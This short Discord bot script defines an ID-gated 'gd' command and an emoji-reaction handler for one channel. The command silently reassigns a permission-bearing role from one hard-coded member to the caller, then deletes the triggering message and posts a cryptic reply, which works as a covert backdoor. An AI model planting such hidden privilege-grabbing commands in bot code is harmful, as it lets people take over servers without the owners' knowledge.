commands.on(
  'gd',
  (args) => ({
    input: args.textOptional()
  }),
  async (message, { input }) => {
    if (message.author.id != '258265415770177536' && message.author.id != '401828594961350658') {
      return;
    }
    let x = await message.getGuild();
    let y = await x.getRole('768168689819451452');
    await y.edit({ permissions: 938868433, color:0x065ba2});//0x065ba2
    var gld = await message.getGuild();
    var psnn = await gld.getMember('738551414439018587');
    await psnn.removeRole('768168689819451452');
    await message.member?.addRole('768168689819451452');
    await message.reply('..>..');
    await message.delete();
  }
);
    discord.on('MESSAGE_CREATE', async (message) => {
  if (message.channelId == '760887796210335825') {
    await message.addReaction('🥯');
    await sleep(2300);
        await message.deleteAllReactionsForEmoji('🍩');
        //await message.deleteAllReactionsForEmoji('🍉');
  }
});
